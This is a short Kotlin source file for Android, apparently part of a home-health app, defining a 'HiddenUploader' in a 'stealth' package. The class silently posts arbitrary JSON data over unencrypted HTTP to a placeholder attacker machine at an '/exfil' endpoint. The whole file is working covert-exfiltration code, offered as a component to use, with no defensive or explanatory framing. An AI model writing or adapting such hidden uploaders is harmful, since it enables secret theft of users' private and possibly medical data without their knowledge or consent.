package com.example.homehealth.stealth

import android.util.Log
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.*
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException

object HiddenUploader {
    private val client = OkHttpClient()

    fun upload(data: JSONObject) {
        val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val body = data.toString().toRequestBody(mediaType)

        val request = okhttp3.Request.Builder()
            .url("http://YOUR_LAPTOP_IP:8082/exfil")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("StealthUploader", "Upload failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d("StealthUploader", "Upload successful")
                response.close()
            }
        })

    }
}